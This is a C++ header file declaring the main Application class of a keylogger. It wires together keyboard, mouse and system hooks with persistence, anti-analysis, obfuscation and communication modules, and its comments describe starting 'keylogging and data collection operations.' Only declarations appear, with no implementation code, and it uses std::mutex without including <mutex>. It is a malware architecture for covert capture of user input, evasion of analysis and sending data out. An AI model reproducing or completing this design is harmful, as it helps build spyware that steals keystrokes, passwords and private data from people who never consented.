// File: Application.h
#pragma once

#include "core/Configuration.h"
#include "core/Logger.h"
#include "hooks/KeyHook.h"
#include "hooks/MouseHook.h"
#include "hooks/SystemHook.h"
#include "persistence/PersistenceManager.h"
#include "security/AntiAnalysis.h"
#include "security/Obfuscation.h"
#include "communication/CommsManager.h"
#include "data/DataManager.h"
#include <memory>
#include <atomic>
#include <thread>

namespace core {

class Application {
public:
    Application();
    ~Application();

    // Delete copy constructor and assignment operator
    Application(const Application&) = delete;
    Application& operator=(const Application&) = delete;

    /**
     * @brief Initializes the application components
     * @return true if initialization successful, false otherwise
     */
    bool initialize();

    /**
     * @brief Starts the keylogging and data collection operations
     */
    void start();

    /**
     * @brief Gracefully stops all application operations
     */
    void stop();

    /**
     * @brief Emergency shutdown procedure
     */
    void emergencyShutdown();

    /**
     * @brief Returns current application state
     */
    std::string getStatus() const;

private:
    /**
     * @brief Performs security checks before starting
     */
    bool performSecurityChecks();

    /**
     * @brief Initializes communication channels
     */
    bool initializeComms();

    /**
     * @brief Main data processing loop
     */
    void processLoop();

    /**
     * @brief Cleanup resources
     */
    void cleanup();

    // Component instances
    std::unique_ptr<Configuration> config_;
    std::unique_ptr<Logger> logger_;
    std::unique_ptr<hooks::KeyHook> keyHook_;
    std::unique_ptr<hooks::MouseHook> mouseHook_;
    std::unique_ptr<hooks::SystemHook> systemHook_;
    std::unique_ptr<persistence::PersistenceManager> persistenceManager_;
    std::unique_ptr<security::AntiAnalysis> antiAnalysis_;
    std::unique_ptr<security::Obfuscation> obfuscation_;
    std::unique_ptr<communication::CommsManager> commsManager_;
    std::unique_ptr<data::DataManager> dataManager_;

    // Thread control
    std::atomic<bool> isRunning_{false};
    std::thread processThread_;
    std::mutex operationMutex_;

    // Application state
    std::atomic<bool> isInitialized_{false};
    std::atomic<int> emergencyLevel_{0};
};

} // namespace core